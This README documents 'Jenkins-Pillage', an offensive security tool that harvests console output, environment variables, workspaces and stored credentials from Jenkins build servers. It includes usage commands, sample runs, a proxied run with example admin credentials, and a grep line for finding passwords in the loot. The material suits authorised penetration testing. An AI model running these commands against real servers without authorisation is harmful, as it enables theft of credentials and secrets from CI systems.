# Jenkins-Pillage
This tool will attempt to pull console output, environment variables, and workspaces associated with Jenkins builds. It works both against unauthenticated and authenticated (with creds) servers.

Typically lots of sensitive information may be retrieveable from these locations and this tool aims to automate the pillaging of that info. Credentials, API endpoints, private keys, and much more have been gathered using Jenkins-Pillage.

## Requirements
 - Python3.6 or greater

 - `pip3 install requests`
 - `pip3 install bs4`

 **OR**
 - `pip3 install pipenv`
 - `pipenv install`

## Help Info
```
$ ./jenkins-pillage.py --help
usage: jenkins-pillage.py [-h] [-b BUILD_URL] [-u USERNAME] [-p PASSWORD]
                          [-l LIST_URL] [-a AUTO] [-f]

Pillage sensitive information from Jenkins servers

optional arguments:
  -h, --help            show this help message and exit
  -b BUILD_URL, --buildurl BUILD_URL
                        The build URL to pillage
  -u USERNAME, --user USERNAME
                        The Basic Auth username for the service
  -p PASSWORD, --password PASSWORD
                        The Basic Auth password for the service
  -l LIST_URL, --list LIST_URL
                        Lists all found build URLs to use with -b
  -a AUTO, --auto AUTO  Automatically perform -l and then -b on a root URL
  -f, --force           Force the URLs to use the supplied socket (in case the
                        server returns localhost)

$ pipenv run start -h
```

## Usage
Docker mode:
```
$ cd /path/to/Jenkins-Pillage
$ docker build -t jenkins-pillage .
$ docker run --rm -it jenkins-pillage -h
    usage: jenkins-pillage.py [-h] [-b BUILD_URL] [-u USERNAME] [-p PASSWORD]
                            [-l LIST_URL] [-a AUTO] [-f]

    Pillage sensitive information from Jenkins servers

    optional arguments:
    -h, --help            show this help message and exit
    -b BUILD_URL, --buildurl BUILD_URL
                            The build URL to pillage
    -u USERNAME, --user USERNAME
                            The Basic Auth username for the service
    -p PASSWORD, --password PASSWORD
                            The Basic Auth password for the service
    -l LIST_URL, --list LIST_URL
                            Lists all found build URLs to use with -b
    -a AUTO, --auto AUTO  Automatically perform -l and then -b on a root URL
    -f, --force           Force the URLs to use the supplied socket (in case the
                            server returns localhost)

# Pass any arguments to the Docker container
$ docker run --rm -it jenkins-pillage -a https://jenkins.example.com
```

Easy mode:
```
$ pip
$ ./jenkins-pillage.py -a https://jenkins.example.com
Getting a list of all build URLs
https://jenkins.example.com/job/Application0/4
https://jenkins.example.com/job/Application1/6
Attempting: https://jenkins.example.com/job/Application0/4
-- FOUND CONSOLE OUTPUT
Attempting: https://jenkins.example.com/job/Application1/6
-- FOUND CONSOLE OUTPUT
-- FOUND ENV VARS
Checking to see if credentials can be decrypted and enumerated
-- FOUND CREDENTIALS IN CREDENTIAL STORE
...
```

List all build URLs recursed from a top level URL:
```
$ ./jenkins-pillage.py -l https://jenkins.example.com
https://jenkins.example.com/job/Application0/4
https://jenkins.example.com/job/Application1/6
...
```

Pull the console output, workspace zip url, and environment variables of a build recursed from above:
```
$ ./jenkins-pillage.py -b https://jenkins.example.com/job/Application0/4
Attempting: https://jenkins.example.com/job/Application0/4
-- FOUND CONSOLE OUTPUT
-- FOUND ENV VARS
-- FOUND WORKSPACE ZIP URL
```
Same but behind an SSH proxy and needs creds to work:
```
$ export all_proxy=socks4a://localhost:1080
$ ./jenkins-pillage.py -b https://jenkins.example.com/job/Application0/4 -u admin -p Password1
Attempting: https://jenkins.example.com/job/Application0/4
-- FOUND CONSOLE OUTPUT
-- FOUND ENV VARS
-- FOUND WORKSPACE ZIP URL
```
The files are pulled down to the current directory. The URL for the zip download is placed in a file as opposed to downloading the zip because many of the zips I've seen can easily fill up your hard drive. Once the files are downloaded, grep to your hearts delight:
```
$egrep -i 'password|Authorization.*Basic|sqlplus|<other_creds_or_commands>' *
```

## Caveat
Jenkins has a _lot_ of available plugins that could also house sensitive data. Use this tool as a first step in pillaging Jenkins boxes. This tool is not a substitute for manual review and is considered in beta so YMMV. Pull requests for additional features are welcome.
